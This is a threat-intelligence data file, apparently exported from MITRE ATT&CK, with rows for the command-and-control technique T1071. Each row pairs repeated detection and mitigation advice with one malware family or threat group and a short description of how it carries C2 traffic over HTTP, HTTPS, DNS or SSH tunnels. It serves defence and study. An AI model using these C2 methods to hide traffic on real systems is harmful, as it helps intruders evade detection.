Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1375,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0013|PlugX]] can be configured to use HTTP or DNS for command and control.[[CiteRef::Dell TG-3390]]'],['DragonOK'],['DragonOK'],['G0017'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: PlugX, Sogu, Kaba",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1376,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0091|Epic]] implements a command and control protocol over HTTP.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Epic, Tavdig, ...",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1377,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0126|ComRAT]] has used HTTP requests for command and control.[[CiteRef::NorthSec 2015 GData Uroburos Tools]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: ComRAT,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1378,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0081|Elise]] communicates over HTTP or HTTPS for C2.[[CiteRef::Lotus Blossom Jun 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: Elise, BKDR_ESILE, Page",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1379,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0082|Emissary]] uses HTTP or HTTPS for C2.[[CiteRef::Lotus Blossom Dec 2015]]'],['Lotus Blossom'],"['Lotus Blossom', 'Spring Dragon']",['G0030'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Emissary,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1380,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0089|BlackEnergy]] communicates with its C2 server over HTTP.[[CiteRef::F-Secure BlackEnergy 2014]]'],['Sandworm Team'],"['Sandworm Team', 'Quedagh']",['G0034'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BlackEnergy, Black Energy",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1381,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0031|BACKSPACE]] uses HTTP as a transport to communicate with its command server.[[CiteRef::FireEye APT30]]'],['APT30'],['APT30'],['G0013'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BACKSPACE, Lecna",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1382,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0034|NETEAGLE]] will attempt to detect if the infected host is configured to a proxy. If so, [[Software/S0034|NETEAGLE]] will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000. [[Software/S0034|NETEAGLE]] will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2. Adversaries can also use [[Software/S0034|NETEAGLE]] to establish an RDP connection with a controller over TCP/7519.[[CiteRef::FireEye APT30]]']",['APT30'],['APT30'],['G0013'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: NETEAGLE,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1383,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0055|RARSTONE]] uses SSL to encrypt its communication with its C2 server.[[CiteRef::Aquino RARSTONE]]'],['Naikon'],['Naikon'],['G0019'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: RARSTONE,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1384,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0060|Sys10]] uses HTTP for C2.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Sys10,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1385,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0059|WinMM]] uses HTTP for C2.[[CiteRef::Baumgartner Naikon 2015]]'],['Naikon'],['Naikon'],['G0019'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: WinMM,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1386,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0042|LOWBALL]] command and control occurs via HTTPS over port 443.[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: LOWBALL,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1387,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0043|BUBBLEWRAP]] can communicate using HTTP or HTTPS.[[CiteRef::FireEye admin@338]]'],['admin@338'],['admin@338'],['G0018'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: BUBBLEWRAP, Backdoor.APT.FakeWinHTTPHelper",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1388,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Group/G0038|Stealth Falcon]] malware communicates with its C2 server via HTTPS.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1389,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['[[Software/S0154|Cobalt Strike]] uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS.  In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol.  All protocols use their standard assigned ports.[[CiteRef::cobaltstrike manual]]']",['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Cobalt Strike,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1390,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0157|SOUNDBITE]] communicates via DNS for C2.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: SOUNDBITE,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1391,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Group/G0037|FIN6]] used the Plink command-line utility to create SSH tunnels to C2 servers.[[CiteRef::FireEye FIN6 April 2016]]'],['FIN6'],['FIN6'],['G0037'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1392,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0084|Mis-Type]] network traffic can communicate over HTTP.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: Mis-Type,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1393,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0085|S-Type]] uses HTTP for C2.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: S-Type,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1394,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0086|ZLib]] communicates over HTTP for C2.[[CiteRef::Cylance Dust Storm]]'],['Dust Storm'],['Dust Storm'],['G0031'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: ZLib,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1395,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['The ""Uploader"" variant of [[Software/S0037|HAMMERTOSS]] visits a hard-coded server over HTTP/S to download the images [[Software/S0037|HAMMERTOSS]] uses to receive commands.[[CiteRef::FireEye APT29]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: HAMMERTOSS, HammerDuke, NetDuke",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1396,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","[""[[Software/S0046|CozyCar]]'s main method of communicating with its C2 servers is using HTTP or HTTPS.[[CiteRef::F-Secure CozyDuke]]""]",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],"Software: CozyCar, CozyDuke, ...",['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
1397,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Netflow/Enclave netflow', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']",['[[Software/S0048|PinchDuke]] transfers files from the compromised host via HTTP or HTTPS to a C2 server.[[CiteRef::F-Secure The Dukes]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],Software: PinchDuke,['Command and Control'],['Technique/T1071'],['Standard Application Layer Protocol'],https://attack.mitre.org/wiki/Technique/T1071
